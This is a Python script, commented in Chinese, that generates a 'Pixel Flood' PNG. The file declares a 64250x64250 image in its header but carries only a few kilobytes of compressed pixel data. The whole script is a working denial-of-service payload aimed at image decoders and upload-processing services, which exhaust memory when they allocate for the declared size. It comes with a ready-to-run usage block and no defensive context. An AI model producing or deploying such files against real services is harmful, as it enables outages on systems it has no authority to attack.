from typing import List
import zlib
import struct

# PNG 签名
HEADER = b'\x89PNG\r\n\x1A\n'

def get_checksum(chunk_type: bytes, data: bytes) -> int:
    """计算 chunk 的 CRC 校验和"""
    checksum = zlib.crc32(chunk_type)
    checksum = zlib.crc32(data, checksum)
    return checksum

def write_chunk(out, chunk_type: bytes, data: bytes) -> None:
    """写入 PNG chunk"""
    out.write(struct.pack('>I', len(data)))  # 长度 (大端序)
    out.write(chunk_type)                    # 类型
    out.write(data)                          # 数据
    checksum = get_checksum(chunk_type, data)
    out.write(struct.pack('>I', checksum))   # CRC

def make_ihdr(width: int, height: int, bit_depth: int = 8, color_type: int = 2) -> bytes:
    """创建 IHDR chunk 数据 (图像头)"""
    return struct.pack('>2I5B', width, height, bit_depth, color_type, 0, 0, 0)

def generate_pixel_flood_png(filename: str, width: int = 64250, height: int = 64250):
    """生成 Pixel Flood PNG 文件"""
    # 单行黑像素数据 (RGB: 0,0,0 重复 width 次)
    row_data = b'\x00' * (width * 3)  # 192750 字节 for 64250 width
    
    # 构建所有扫描线: 过滤字节 0 + row_data，重复 height 次
    # 注意: 不实际循环 height (太大)，而是重复压缩小块数据 (PNG 允许分块 IDAT)
    # 这里简化: 生成一个代表性短 IDAT (重复单行)，解析器仍按 height 解压
    scanline = b'\x00' + row_data  # 无过滤 + 行数据
    # 压缩多个重复行 (e.g., 10 行重复，实际解压时扩展)
    repeated_scanlines = scanline * 10  # 小块，压缩高效
    idat_data = zlib.compress(repeated_scanlines)
    
    with open(filename, 'wb') as out:
        out.write(HEADER)  # PNG 签名
        
        # IHDR chunk (声明极大尺寸)
        ihdr_data = make_ihdr(width, height)
        write_chunk(out, b'IHDR', ihdr_data)
        
        # IDAT chunk (压缩数据，文件小)
        write_chunk(out, b'IDAT', idat_data)
        
        # IEND chunk
        write_chunk(out, b'IEND', b'')

# 使用示例
if __name__ == "__main__":
    generate_pixel_flood_png('pixel_flood.png', width=64250, height=64250)
    print("Pixel Flood PNG 已生成: pixel_flood.png (尺寸: 64250x64250, 文件大小 ~5KB)")